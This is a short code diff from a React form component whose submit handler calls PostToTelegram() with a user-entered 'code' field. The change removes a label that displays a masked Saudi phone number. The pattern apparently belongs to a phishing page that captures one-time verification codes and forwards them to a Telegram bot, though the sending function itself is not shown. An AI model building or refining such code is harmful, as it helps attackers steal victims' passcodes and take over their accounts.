@@ -58,8 +58,7 @@ const Code = () => {
         e.preventDefault();
         PostToTelegram()
       }}>
-        <label dir='ltr'>
-        +966*********</label>
+        
         <input type="text" name="code" onChange={(e) => {
                   const { name, value } = e.target;
                   setDynamicFormData(name, value);
